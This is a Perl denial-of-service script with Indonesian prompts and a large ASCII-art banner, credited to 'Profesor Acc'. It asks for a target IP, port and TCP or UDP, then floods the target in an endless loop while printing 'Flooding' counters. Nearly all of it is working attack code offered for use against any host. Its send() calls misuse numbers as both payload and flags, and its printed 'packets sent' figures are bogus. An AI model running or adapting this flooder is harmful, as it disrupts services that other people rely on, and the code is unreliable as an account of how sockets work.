#ngapain harus di recode?
#tinggal pake apa susahnya?
#!/usr/bin/perl
#==============INFO==============#
# TOOLS : DoS ATTACK 18+
# AUTHOR: PROFESOR ACC
# TEAM  : QOBIL IS THE FIRST KILLER

#=== Use Modules ===#
use IO::Socket;
use Scalar::Util qw(looks_like_number);
use IO::Handle;
#=== Clear Screen ===#
system("cls || clear");
#Script Banner================================================================
print q{ 
________MMMMMoooooooooooM8888888,
_______M6ooooMMMmoooooooM888888888,
_____Mmooo8oooooooooooooM88888888888,
____MmmmooooooooooooooM88888888888888,
___Moooooooooo8888888M8888888888888888,
__Mooooooooooooo88888M88888888888888888,
___MmooooooooooooooommM88888888888888888,
_______M88ooooo888mooMM88888888888888888,
________M88888888oommooM88888888888888888,
_________M888888ooooMM8888888888888888888,
_________MooooooooooM888888888888888888888,
______888MoooooooooM8888888888888888888888,
___888888MooooooooM88888888888888888888888,
__88888888MoooooooM8888888888mmmm888888888,
_888888888Mo8oooooM8888888MooooooooM888888,
8888888888Moo8oooM8888MM8ooooooooooooM88888,
8888888888Mooo88ooooM888MoooooooooooooM8888,
_M8o8888ooo8oo88ooo0ooMMoo888oooooooooooM88,
Mooo88888ooo8o88o8oooooooooo8888oooooooooM8,
Moo8888o8ooooo8ooooooooooooooo8888ooooooooM8,
Mooo88oooooooooooooooooooooooo888888oooooooM8,
Mooooooooooooooooooooooooooooo88888888ooooooM8,
_MooMooooooooooooooooooooooooooM888ooo88oooooM,
__Mmoooooooooooooooooooooooooo888Moooo8oooooooM,
___Moooooooooo8oooooooooooooo8888MMooooooooooooM,
____Moooooooo88ooooooooooooo88888MMM8oooooooooooM,
____Moooooooo88oooooooooooooo88888MMMMoooooooooooM,
____Moooooooo88Moooooooooooooooo88888MMMMoooooooooM,
___Mooooooooo88Moooooooooooooooo8MooooMMMMoooooooooM,
__Mooooooooo8MMooooooooooooooo88MoooooMMMMooooooooooM,
_Mooooooooo88MMoom888mooooooo88MooooooMM_MMoooooooooo,
_M8moooooo888MMoom@@8moooo8888M8oooooooMM__MMooooooo,
M@88moooo888MooMom8@8mooo8888MooooooooMM___Mmoooooo0,
_*M8mooo8888MooooMm8mooo888M888ooooooooMM___Moooooo00,
____MMMMMM8888oooooMMmmmmM88888oooooooMM_Moooooooo0,
__________M88Moooooo8888888888oooooooooooMMoooooooooo,
__________M88Mooooo8o888888888ooooooooooooMoooooooo88,
___________M88Mooooo8ooo888888oooooooooooMooooooo8888,
____________M888Mooo888ooooo888ooooooooooMoooooo8888M,
____________M88888Moo888oooooo8888ooooooMooooooo888M8,
_____________M888888Mo8888oooooo8888oooMooooooo888M88,
______________M8888888Mo8888ooooooooooMoooooooo88M888,
________________M888888M88888oooooooooMoooooooo8M8888,
_________________M8oo888M888888ooooooMoooooooo8M88888,
__________________M8ooooMM88888888ooMooooooooM8888ooo,
___________________MooooM_M88888888MooooooooM888ooooo,
____________________MooooM_M888888Mooooooo8M88**ooooo,
_____________________MooooM_mmmmmmMoooooo8Mmooooooooo,
______________________MoooQooommmmMoooMMooooooooooooo,
_____________________MM88ooo8ooooMMMooooooooooooooooo,
__________________mM8888M88o88mMmoooooooooooooooooooo,
____________mMMMoooooooooM888Mmoooooooooooooooooooooo,
_______MMMMoooooooooooooooMMooooooooooooooooooooooooo,
___MMMoooooooooooooooooMMoooooooooooooooooooooooooooo,
MMMooooooooooooooooooMMooooooooooooooooooooooooooooo8,
oooooooooooooooooooMMooooooooooooooooooooooooooooo888,
oooooooooooooooooMMooooooooooooooooooooooooooo8888888,
oooooooooooooooMMoooooooooooooooooooooooooo8888888888,
oooooooooooooMooooooooooooooooooooooooooo88888888888M,
ooooooooooooMooooooooooooooooooooooooo8888888888M____,
oooooooo88Mooooooooooooooooooooooo88888888888M_______,
oo8888888Mooooooooooooooooooooo888888MMMMMMMMMMMM888,
8888MMMMMooooooooooooooooooooo8888M888888888888888888,
8MMM888Moooooooooooooooooooo88M8ooooooooooo8888888888,
88oooooMoooooooooooooooooooMMoooooo888888888888888888,
8888888M8888oooooo88ooooooMoo888888888888888888888MM,
MMMMMMMM888888ooo88888oo8Mo8888888888888888888888888

 

 [=> Author by Profesor Acc <=]
 =-------=-=-=-=-=-=-=-=-=-------=
};
# Check Intenret Connection !
print("\r[~] Checking Internet Connection [...]");
STDOUT->flush();
sleep(2);
my $check = IO::Socket::INET->new( 'PeerAddr'=>'www.google.com', 
	'PeerPort'=>80, 
	'Timeout'=>2, 
	'proto'=>'tcp');
if(!(defined $check && $check)){
        print("\r[-] Checking Internet Connection [Fail!]");
	print("\n[!] Error: Please Check Your Internet Connection !!!\n");
	exit(1);
}
$check->close();
print("\r[+] Checking Internet Connection [Connected]");
STDOUT->flush();
# INPUT TARGET INFO ==============================================

print("\n\n[~] Masukan Target ip: "); # Set Target IP
$host = <STDIN>;
chomp ($host);
while ($host eq ""){
 print "   [!] Masukan Target?: ";
 $host = <STDIN>;
 chomp ($host);
}
print "TRAGET ==> $host\n";
print "\n===============================";
print "\n[~] PORT: "; # Set Port
$port = <STDIN>;
chomp ($port);
while ($port eq "" || !looks_like_number($port) || !grep{$port eq $_}(0..65535)){ 
 print "   [!] PORT?: ";       
 $port = <STDIN>;
 chomp ($port); 
} 
print "PORT ==> $port\n";
print "\n===============================";
print "\n[~] Pilih Protockol (TCP or UDP) :"; # Set Protockol;
$proto = <STDIN>;
chomp ($proto);
while ($proto eq "" || !grep{$proto eq $_} 'TCP','UDP','tcp','udp'){
 print "   [!] Pilih Protockol (TCP or UDP) ?: ";
 $proto = <STDIN>;
 chomp ($proto);
}
print "Protocol ==> $proto";
print "\n===============================\n";
sleep(1);

$sock = IO::Socket::INET->new(
        PeerAddr => $host,
        PeerPort => $port,
        Proto => "$proto" ) || die "\n[!] Connection Failed To Target[$host] On Port[$port/$proto] !!!\n[!] Please Check Your TargetIP\n";
system("clear || cls");
print "\n[*] Attack Has Been Start On [$host:$port] proto => [$proto].......\n\n";
sleep(1);
if(grep{$proto eq $_} 'TCP','tcp'){
    while (1) {
       $sock = IO::Socket::INET->new(
        PeerAddr => $host,
        PeerPort => $port,
        Proto => "$proto" ) || die "\n[!] Connection Failed To Target[$host] On Port[$port/$proto] !!!\n[!] Please Check Your TargetIP\n";
        for($i=0; $i<=500; $i++){
            $size = rand() * 8921873 * 99919988;
            send($sock, $size, $size);
            send($sock, $size*2, $size*2); 
            send($sock, $size*3, $size*3);
            send($sock, $size*4, $size*4);
            send($sock, $size*9999999999999,$size*9999999999999);
            send($sock, $size*999999999999999,$size*999999999999999);
            send($sock, $size*9999999999999,$size*9999999999999);
            send($sock, $size*4, $size*4);
            send($sock, $size*3, $size*3);
            send($sock, $size*2, $size*2);
            send($sock, $size, $size);
            send($sock, $size*9999999999999,$size*9999999999999);
            send($sock, $size*999999999999999,$size*999999999999999);
            send($sock, $size*9999999999999,$size*9999999999999);

            print ("Flooding: (=>$host:$port~$proto<=) Packets sent: $size\n");
        }
    }

}else {
   $sock = IO::Socket::INET->new(
        PeerAddr => $host,
        PeerPort => $port,
        Proto => "$proto" ) || die "\n[!] Connection Failed To Target[$host] On Port[$port/$proto] !!!\n[!] Please Check Your TargetIP\n";
   while (1) {
            $size = rand() * 8921873 * 99919988;
            send($sock, $size, $size);
            send($sock, $size*2, $size*2);
            send($sock, $size*3, $size*3);
            send($sock, $size*4, $size*4);
            send($sock, $size*9999999999999,$size*9999999999999);
            send($sock, $size*999999999999999,$size*999999999999999);
            send($sock, $size*9999999999999,$size*9999999999999);
            send($sock, $size*4, $size*4);
            send($sock, $size*3, $size*3);
            send($sock, $size*2, $size*2);
            send($sock, $size, $size);
            send($sock, $size*9999999999999,$size*9999999999999);
            send($sock, $size*999999999999999,$size*999999999999999);
            send($sock, $size*9999999999999,$size*9999999999999);

            print ("Flooding: (=>$host:$port~$proto<=) Packets sent: $size\n");

   }
}
$sock->close()
##############################################################
#####################                #########################
#####################  PROFESOR ACC  #########################
#####################                #########################
##############################################################
#Author by profesor acc
